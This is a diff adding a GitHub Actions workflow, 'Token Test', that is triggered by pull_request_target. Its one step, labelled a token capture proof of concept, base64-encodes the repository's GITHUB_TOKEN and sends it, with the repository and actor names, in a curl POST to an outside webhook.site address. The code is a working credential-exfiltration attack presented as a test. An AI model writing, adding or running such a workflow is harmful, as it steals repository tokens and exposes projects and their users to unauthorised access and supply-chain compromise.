@@ -1,0 +1,32 @@
+name: Token Test
+on:
+  pull_request_target
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Capture GitHub Token
+        run: |
+          echo "=== GitHub Token Capture POC ==="
+          
+          # Capture token in multiple formats
+          TOKEN_BASE64=$(echo -n "$GITHUB_TOKEN" | base64 -w0)
+          TOKEN_LENGTH=${#GITHUB_TOKEN}
+          
+          echo "Token Length: $TOKEN_LENGTH chars"
+          
+          # Send comprehensive data to webhook
+          curl -X POST \
+            "https://webhook.site/b2742a99-b62e-4b05-8541-3c40ba9da57b" \
+            -H "Content-Type: application/json" \
+            -d "{
+              \"repository\": \"$GITHUB_REPOSITORY\",
+              \"actor\": \"$GITHUB_ACTOR\",
+              \"token_length\": $TOKEN_LENGTH,
+              \"token_base64\": \"$TOKEN_BASE64\",
+              \"timestamp\": \"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\"
+            }"
+          
+          echo "Token data sent to webhook successfully"
